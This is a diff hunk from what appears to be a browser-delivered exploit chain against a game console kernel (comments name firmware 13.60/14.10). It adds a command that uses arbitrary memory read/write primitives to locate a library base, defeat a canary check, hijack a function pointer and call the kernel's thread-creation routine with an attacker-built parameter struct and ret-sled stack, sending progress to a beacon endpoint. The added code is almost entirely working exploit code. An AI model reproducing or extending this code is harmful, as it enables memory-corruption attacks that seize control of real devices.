@@ -5497,6 +5497,118 @@ function _startWsShell(){
         break;
       }
 
+      case 'tw':{
+        /* THE THREAD WITNESS (the game lane's 56l probe ported): the
+         * thr_new candidate (export entry #msg.idx) called with a FULLY
+         * VALID param struct AT THE FAKE SCOPE (RDI). RSI = cfr (huge)
+         * passes the kernel's param_size >= sizeof check (proven on
+         * 13.60: ret=0, child_tid written by the kernel, tls_base=0 ok).
+         * start_func = the PROVEN thr_self stub (entry #5, B+0x2C0) -
+         * the child spins writing its own tid to argBuf = the park
+         * (the game lane used jmp$; we use a stub ret-sled). The stack
+         * = the cage view window filled with the stub address. The
+         * kernel writes the new TID to child_tid/parent_tid = OUR
+         * CAGE POINTERS - no frame corruption possible. THE WITNESS:
+         * child_tid != 0 in the reply = THREAD CREATION ON 14.10 =
+         * sustained execution + full register control (child RIP/RSP/
+         * RDI from our param) = the game lane's endgame opens.
+         * NOTE: the zeroed-scope sweep deaths at #49/#51/#54/#63 are
+         * CONSISTENT with thr_new (start_func=NULL crashes the child);
+         * with a valid param the same entry succeeds. */
+        if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
+        function TW(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('TW-'+s),false);x.send();}catch(e){}}
+        try{
+          var ent=S.absRead(0x10001c8000n,0x100);
+          var trPtr=0n;
+          for(var ei=0;ei<ent.length;ei++){if(ent[ei]>=0x10001f0000n&&ent[ei]<0x1000200000n){trPtr=ent[ei];break;}}
+          TW('1 tr=0x'+trPtr.toString(16));
+          if(trPtr===0n){reply.err='no thread-record ptr';break;}
+          var tr=S.absRead(trPtr,0x60);
+          var ptp=0n;
+          for(var ti2=0;ti2<tr.length;ti2++){if(tr[ti2]>=0x880000000n&&tr[ti2]<0x900000000n){ptp=tr[ti2];break;}}
+          TW('2 pt=0x'+ptp.toString(16));
+          if(ptp===0n){reply.err='no pthread ptr';break;}
+          var node=ptp,Q=0n;
+          for(var hop=0;hop<5;hop++){
+            var p=S.absRead(node,0x60);
+            Q=p[8];
+            if((Q&0x3fffn)===0x218n&&Q>0x800000000n)break;
+            node=Q-0x38n;
+          }
+          if((Q&0x3fffn)!==0x218n){reply.err='backlink fail';break;}
+          var B=Q-0x6C218n;
+          if(B%0x4000n!==0n){reply.err='base unaligned';break;}
+          TW('3 B=0x'+B.toString(16));
+          var can=S.absRead(B+0x751D0n,8)[0];
+          TW('4 canary=0x'+can.toString(16));
+          if(!(can>0x1000000n)){reply.err='canary fail';break;}
+          reply.base='0x'+B.toString(16);
+          /* read the export entry #msg.idx */
+          var tbl=B+0x48000n;
+          var idx=parseInt(msg.idx)||49;
+          var e1=S.absRead(tbl+BigInt(0xC+idx*8),8)[0];
+          var sR=Number(e1&0xFFFFFFFFn);
+          var txt=0x48000+Number(BigInt.asIntN(32,BigInt(sR)));
+          var target=B+BigInt(txt);
+          TW('5 idx='+idx+' text=0x'+txt.toString(16)+' target=0x'+target.toString(16));
+          reply.idx=idx;
+          reply.text='0x'+txt.toString(16);
+          /* BUILD THE PARAM at fakeScope (0x50 bytes):
+           * +0x00 start_func +0x08 arg +0x10 stack_base +0x18 stack_size
+           * +0x20 tls_base +0x28 tls_size +0x30 child_tid +0x38 parent_tid
+           * +0x40 flags +0x48 rtp  (the game lane 56l layout) */
+          var thrStub=B+0x2C0n;                    /* the PROVEN thr_self stub */
+          var argBuf=S.fakeScope+0x100n;           /* child writes its tid here */
+          var tidOut=S.fakeScope+0x180n;           /* child_tid target */
+          var parOut=S.fakeScope+0x188n;           /* parent_tid target */
+          var stackBase=S.viewBase+0x100000n;       /* 1MB into the 64MB view */
+          var stackSize=0x40000;                   /* 256KB park stack */
+          TW('6 building param stub=0x'+thrStub.toString(16));
+          S.absWrite(S.fakeScope+0x00n,thrStub);
+          S.absWrite(S.fakeScope+0x08n,argBuf);
+          S.absWrite(S.fakeScope+0x10n,stackBase);
+          S.absWrite(S.fakeScope+0x18n,BigInt(stackSize));
+          S.absWrite(S.fakeScope+0x20n,0n);         /* tls_base = 0 (56l-proven) */
+          S.absWrite(S.fakeScope+0x28n,0n);
+          S.absWrite(S.fakeScope+0x30n,tidOut);
+          S.absWrite(S.fakeScope+0x38n,parOut);
+          S.absWrite(S.fakeScope+0x40n,0n);        /* flags */
+          S.absWrite(S.fakeScope+0x48n,0n);        /* rtp */
+          /* zero the witness buffers */
+          S.absWrite(tidOut,0n);
+          S.absWrite(parOut,0n);
+          S.absWrite(argBuf,0n);
+          /* FILL the park stack with the thr_self stub address (ret-sled) */
+          TW('7 filling stack 0x'+stackSize.toString(16));
+          var fillN=Math.floor(stackSize/8);
+          for(var fi=0;fi<fillN;fi++){
+            S.absWrite(stackBase+BigInt(fi*8),thrStub);
+          }
+          TW('8 stack filled n='+fillN);
+          /* THE CALL: RDI = fakeScope (the param), RSI = cfr (huge size).
+           * DO NOT zero the scope - the param IS the scope. */
+          if(S.scopeSlot&&S.fakeScope&&S.scopeOrig)S.absWrite(S.scopeSlot,S.fakeScope);
+          var origFnR=S.absRead(S.neEntry.addr+0x28n,8)[0];
+          S.absWrite(S.neEntry.addr+0x28n,target);
+          TW('9 CALLING');
+          try{Math.round(-5.7);}catch(e){}
+          S.absWrite(S.neEntry.addr+0x28n,origFnR);
+          if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
+          TW('10 RETURNED');
+          /* THE WITNESS READ (beacon FIRST - banks even if the child
+           * crash races the reply post) */
+          var ct=S.absRead(tidOut,8)[0];
+          var pt2=S.absRead(parOut,8)[0];
+          var ab=S.absRead(argBuf,8)[0];
+          TW('11 child_tid=0x'+ct.toString(16)+' parent_tid=0x'+pt2.toString(16)+' argbuf=0x'+ab.toString(16));
+          reply.child_tid='0x'+ct.toString(16);
+          reply.parent_tid='0x'+pt2.toString(16);
+          reply.argbuf='0x'+ab.toString(16);
+          reply.verified=(S.absRead(S.neEntry.addr+0x28n,8)[0]===origFnR);
+        }catch(e2){reply.err='tw fault: '+String(e2&&e2.message?e2.message:'?');}
+        break;
+      }
+
       case 'e2witness':{
         /* v16 - THE ROBUST CHAIN + THE NID TABLE READER. The NID
          * computation is CRACKED (ps5rs algorithm.rs: SHA1(name + salt
